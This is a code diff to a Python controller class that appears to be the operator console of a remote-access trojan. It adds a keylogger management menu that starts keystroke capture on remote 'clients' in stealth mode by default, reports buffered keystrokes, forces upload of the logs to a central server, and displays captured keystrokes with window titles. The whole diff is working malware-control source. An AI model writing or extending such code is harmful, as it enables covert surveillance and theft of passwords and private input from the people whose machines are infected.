@@ -151,7 +151,8 @@ class Controller:
             print("5. 🚀 Start process")
             print("6. ⚡Execute command")
             print("7. 💻 Get system info")
-            print("8. 🔙 Back to main menu")
+            print("8. ⌨️  Keylogger Management")
+            print("9. 🔙 Back to main menu")
             
             
             choice = input("\nSelect option(1-8): ").strip()
@@ -171,6 +172,8 @@ class Controller:
             elif choice == "7":
                 self.handle_system_info(client_id)
             elif choice == "8":
+                self.keylogger_management_menu(client_id)
+            elif choice == "9":
                 break
             else:
                 print("[-] Invalid option")
@@ -482,7 +485,146 @@ class Controller:
                 break
             else:
                 print("[-] Invalid option")
+                
+    def keylogger_management_menu(self, client_id):
+        while True:
+            print("\n" + "="*50)
+            print(f"KEYLOGGER MANAGEMENT - Client: {client_id}")
+            print("="*50)
+            print("1. 🚀 Start Keylogger")
+            print("2. 🛑 Stop Keylogger")
+            print("3. 📊 Get Keylogger Status")
+            print("4. 📨 Force Log Upload")
+            print("5. 📝 View Captured Keylogs")
+            print("6. 🔙 Back to process menu")
+            
+            choice = input("\nSelect option(1-5): ").strip()
+            
+            if choice == "1":
+                self.handle_start_keylogger(client_id)
+            elif choice == "2":
+                self.handle_stop_keylogger(client_id)
+            elif choice == "3":
+                self.handle_keylogger_status(client_id)
+            elif choice == "4":
+                self.handle_force_upload(client_id)
+            elif choice == "5":
+                self.view_keylogs(client_id)
+            elif choice == "6":
+                break
+            else:
+                print("[-] Invalid option")
+    
+    def handle_start_keylogger(self, client_id):
+        stealth = input("Enable stealth mode? (y/n, default=y): ").strip().lower()
+        stealth_mode = stealth != 'n'
+        
+        print(f"\n[+] Starting keylogger on {client_id}...")
+        result = self.send_process_command(client_id, "start_keylogger", {
+            "stealth": stealth_mode
+        })
+        
+        if result and result.get('success'):
+            print(f"[+] ✅ Keylogger started successfully!")
+            print(f"    Log file: {result.get('log_file', 'Unknown')}")
+            print(f"    Stealth mode: {result.get('stealth_mode', 'Unknown')}")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] ❌ Failed to start keylogger: {error}")
+    
+    def handle_stop_keylogger(self, client_id):
+        confirm = input("Are you sure you want to stop the keylogger? (y/n): ").strip().lower()
+        if confirm == 'y':
+            print(f"\n[+] Stopping keylogger on {client_id}...")
+            result = self.send_process_command(client_id, "stop_keylogger")
+            
+            if result and result.get('success'):
+                print(f"[+] ✅ Keylogger stopped successfully!")
+                print(f"    Message: {result.get('message', '')}")
+            else:
+                error = result.get('error', 'Unknown error') if result else 'No response'
+                print(f"[-] ❌ Failed to stop keylogger: {error}")
+        else:
+            print("[!] Operation cancelled")
+    
+    def handle_keylogger_status(self, client_id):
+        print(f"\n[+] Getting keylogger status for {client_id}...")
+        result = self.send_process_command(client_id, "get_keylogger_status")
+        
+        if result and not result.get('error'):
+            print("\n" + "="*50)
+            print("KEYLOGGER STATUS")
+            print("="*50)
+            
+            status_info = [
+                ('Running', 'running'),
+                ('Stealth Mode', 'stealth_mode'),
+                ('Buffered Keystrokes', 'buffered_keystrokes'),
+                ('Log File Size', 'log_file_size'),
+                ('Log File Path', 'log_file_path'),
+                ('Archived Logs', 'archived_logs')
+            ]
+            
+            for display_name, key in status_info:
+                value = result.get(key, 'N/A')
+                if key == 'log_file_size' and isinstance(value, (int, float)):
+                    value = f"{value / 1024:.2f} KB"
+                print(f"{display_name:<20}: {value}")
+                
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] ❌ Failed to get keylogger status: {error}")
+    
+    def handle_force_upload(self, client_id):
+        print(f"\n[+] Forcing keylog upload for {client_id}...")
+        result = self.send_process_command(client_id, "get_keylog_data")
+        
+        if result and not result.get('error'):
+            print(f"[+] ✅ {result.get('message', 'Keylog data sent to server')}")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] ❌ Failed to force upload: {error}")
 
+
+    
+    def view_keylogs(self, client_id):
+        """Afficher les keylogs récents (nécessite un endpoint serveur)"""
+        try:
+            print(f"\n[+] Fetching recent keylogs for {client_id}...")
+            response = requests.get(f"{self.server_url}/admin/keylogs/{client_id}", timeout=10)
+            
+            if response.status_code == 200:
+                keylogs = response.json().get('keylogs', [])
+                
+                if keylogs:
+                    print(f"\n[+] Found {len(keylogs)} recent keylogs:")
+                    print("-" * 80)
+                    
+                    for log in keylogs[:20]:  # Afficher les 20 premiers
+                        timestamp = log.get('timestamp', 'Unknown')
+                        window = log.get('window', 'Unknown')[:30]
+                        keystroke = log.get('keystroke', 'Unknown')
+                        
+                        # Formater le timestamp
+                        try:
+                            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
+                            time_str = dt.strftime("%H:%M:%S")
+                        except:
+                            time_str = timestamp
+                        
+                        print(f"[{time_str}] {window}: {keystroke}")
+                    
+                    if len(keylogs) > 20:
+                        print(f"\n[!] Showing 20 out of {len(keylogs)} keylogs")
+                else:
+                    print("[-] No keylogs found for this client")
+            else:
+                print(f"[-] Failed to fetch keylogs: {response.status_code}")
+                
+        except Exception as e:
+            print(f"[-] Error fetching keylogs: {e}")
+        
+        
 if __name__ == "__main__":
     controller = Controller()
     controller.interactive_mode()
